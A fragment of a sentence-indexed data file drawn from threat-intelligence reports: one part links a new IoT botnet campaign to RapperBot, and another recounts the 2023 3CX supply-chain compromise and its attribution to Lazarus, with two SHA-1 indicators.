sample.","14455":"This campaign did not support stopping or restarting the Telnet propagation, and while the samples support the same commands, their associated IDs did not match. ","14456":"The similar lists of credentials suggest that the threat actor behind this current campaign has access to the source code for the earlier campaign, as this code was not found in other IoT malware samples. ","14457":"Connections to RapperBot The fact that samples from both campaigns use the same C2 protocol, coupled with the absence of this campaign during the RapperBot campaign active between June and Aug 2022 and its recent reappearance, seems to be more than a coincidence. ","14458":"With the several similarities between the two campaigns outlined below, we believe that either the same threat actor might be behind both campaigns or each campaign might have branched from the same privately-shared source code. ","14459":"The C2 commands and corresponding IDs are identical in both campaigns (excluding the Telnet-related commands, as those do not apply to RapperBot) Both campaigns show a certain degree of effort in optimizing the brute forcing implementation.","14460":"Code for the brute forcing implementation is significantly more structured than typical IoT malware that copies and pastes code with minimal modifications. ","14461":"RapperBot also supported the TCP STOMP attack popularized by Mirai.","14462":"This attack was not observed in the earlier campaigns mentioned above.","14463":"However, as both Mirai and Satori source code are publicly available, this is considered a very weak link between the campaigns. ","14464":"If both campaigns were related, the reason for restarting an older campaign remains a mystery. ","14465":"Conclusion Based on the undeniable similarities between this new campaign and the previously reported RapperBot campaign, it is highly likely that they are being operated by a single threat actor or by different threat actors with access to a privately-shared base source code. ","14466":"Unlike the previous RapperBot campaign, this new campaign has a clear motivation to compromise as many IoT devices as possible to build a DDoS botnet. ","14467":"Although this new campaign has evolved significantly from previous campaigns, mitigating it remains the same\u2014setting strong passwords for all devices connected to the internet.

","15091":"The 3CX supply-chain attack 3CX is an international VoIP software developer and distributor that provides phone system services to many organizations.","15092":"According to its website, 3CX has more than 600,000 customers and 12,000,000 users in various sectors including aerospace, healthcare, and hospitality.","15093":"It provides client software to use its systems via a web browser, mobile app, or a desktop application.","15094":"Late in March 2023, it was discovered that the desktop application for both Windows and macOS contained malicious code that enabled a group of attackers to download and run arbitrary code on all machines where the application was installed.","15095":"Rapidly, it was determined that this malicious code was not something that 3CX added themselves, but that 3CX was compromised and that its software was used in a supply-chain attack driven by external threat actors to distribute additional malware to specific 3CX customers.

","15117":"On March 30th, Joe Desimone, a security researcher from Elastic Security, was among the first to provide, in a Twitter thread, substantial clues that the 3CX-driven compromises are probably linked to Lazarus.","15118":"He observed that a shellcode stub prepended to the payload from d3dcompiler_47.dll is similar to AppleJeus loader stubs attributed to Lazarus by CISA back in April 2021.

","15124":"Then, on April 11th, the CISO of 3CX summarized Mandiant\u2019s interim findings in a blogpost.","15125":"According to that report, two Windows malware samples, a shellcode loader called TAXHAUL and a complex downloader named COLDCAT, were involved in the compromise of 3CX.","15126":"No hashes were provided, but Mandiant\u2019s YARA rule, named TAXHAUL, also triggers on other samples already on VirusTotal: ","15127":"SHA-1: 2ACC6F1D4656978F4D503929B8C804530D7E7CF6 (ualapi.dll), SHA-1: DCEF83D8EE080B54DC54759C59F955E73D67AA65 (wlbsctrl.dll) The filenames, but not MD5s, of these samples coincide with those from Kaspersky\u2019s blogpost.","15128":"However, 3CX explicitly states that COLDCAT differs from Gopuram.
